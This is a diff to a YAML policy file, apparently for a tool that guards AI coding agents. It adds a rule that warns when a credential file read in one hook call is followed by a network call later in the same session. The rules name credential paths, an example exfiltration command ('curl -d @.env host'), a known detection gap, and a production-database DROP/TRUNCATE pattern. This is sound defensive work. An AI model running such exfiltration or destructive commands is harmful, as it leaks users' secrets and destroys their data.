@@ -292,6 +292,33 @@ rules:
       - "A deploy step that rsyncs or scps BUILD OUTPUT to a remote host, run in the same session as an earlier, unrelated read of a secret file (e.g. an env var lookup during setup), will still deny — the flow tracker has no payload correlation: it only knows a secret was read THIS session and a remote-copy sink ran, not whether the same bytes moved. rsync/scp joined the sink verb list in the M5 lane, closing a documented miss (SECURITY.md's no-exfil-flow redteam row); a single command that reads AND sends a secret in one shot (curl -d @.env host) remains a known, separate gap — the tracker needs two distinct tool calls to correlate. See docs/exfil.md."
     message: "Data read from sensitive files must not be sent over the network."
 
+  - id: no-exfil-flow-cross-call
+    type: flow
+    sources:
+      - "**/.env*"
+      - "**/.ssh/**"
+      - "**/*.pem"
+      - "**/.git-credentials"
+      - "**/.aws/credentials"
+      - "**/.config/gcloud/**"
+      - "**/Library/Keychains/**"
+      - "**/.npmrc"
+      - "**/.netrc"
+    sinks: [network]
+    action: warn
+    level: sprint
+    priority: 84
+    category: exfil
+    severity: high
+    confidence: medium
+    mode: warn
+    cross_call: true
+    rationale: "no-exfil-flow's in-memory FlowTracker only correlates a read and a later sink inside ONE live process (see docs/exfil.md). keel hook <host> (Claude Code, Gemini CLI, Cursor, Codex, cline, generic) runs a fresh process per tool call, so that correlation was inert there beyond a single piped command. This sibling rule checks the SAME sources/sinks against a persisted, session-scoped, TTL'd store (flow-store.ts, PersistentFlowStore) instead of in-memory state, so a read in one hook process and a sink in a LATER one, same session, now produces a signal too. Shipped as warn, not deny: the correlation window here is the store's TTL (about an hour), not one live process, so a legitimate build that reads a token in one call and hits the network in a later, unrelated one is a realistic hit, not an edge case a hard block could absorb."
+    remediation: "If this fires on a routine build or deploy step, it is very likely a false positive from an unrelated earlier read this session — no-exfil-flow (deny) is the rule to treat as a real interruption; this one is an early-warning signal only."
+    false_positives:
+      - "The same false-positive shape no-exfil-flow already documents (an unrelated secret read earlier in the session, followed by an unrelated network call later) — but wider, because the correlation window here spans MULTIPLE processes over the store's TTL, not one live process. This is exactly why this rule is warn/sprint, not deny/protect."
+    message: "Cross-call correlation: an earlier hook call this session read a credential-shaped path; this call looks network-shaped. If unrelated, this is a false positive - see no-exfil-flow for the hard-block version of this pattern."
+
   - id: prod-db-destruction
     type: command
     match: "(?=.*(?<![A-Za-z])(prod|production|live)(?![A-Za-z]))(?=.*(psql|mysql|sqlite3|mariadb|pg_restore|cockroach)(?![A-Za-z]))(?=.*(DROP[ \t\\n]+(TABLE|DATABASE|SCHEMA)|TRUNCATE(?![A-Za-z])))(psql|mysql|sqlite3|mariadb|pg_restore|cockroach|.)"
